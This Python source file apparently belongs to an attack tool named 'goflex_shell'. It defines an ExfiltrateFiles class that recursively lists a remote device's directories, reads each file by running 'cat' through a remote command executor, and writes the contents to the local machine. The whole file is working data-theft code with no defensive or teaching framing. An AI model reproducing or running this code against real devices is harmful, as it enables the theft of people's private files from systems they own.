import os
from pathlib import Path

from config import ROOT_DIR
from goflex_shell.command_executor import CommandExecutor
from wrappers.base_wrapper import BaseCommand
from wrappers.list_dir_info import ListPathInfo


class ExfiltrateFiles(BaseCommand):

    def execute(self, path: str) -> None:
        for file in ListPathInfo(self.ip).execute(path):
            full_path = str(Path(path).parent / file.name)
            print(f"Downloading {full_path}")

            if file.is_dir:
                print(f"Identified as folder")

                self.execute(full_path)
            else:
                print(f"Identified as file")
                self._write_to_file(full_path, CommandExecutor.execute(self.ip, f'cat "{file.name}"'))

    @staticmethod
    def _write_to_file(path: str, data: bytes) -> None:
        new_path = Path(path.lstrip("\\"))
        relative_new_path = ROOT_DIR / new_path

        try:
            os.makedirs(str(relative_new_path.parent))
        except OSError:
            pass

        with open(relative_new_path, 'wb') as file:
            file.write(data)
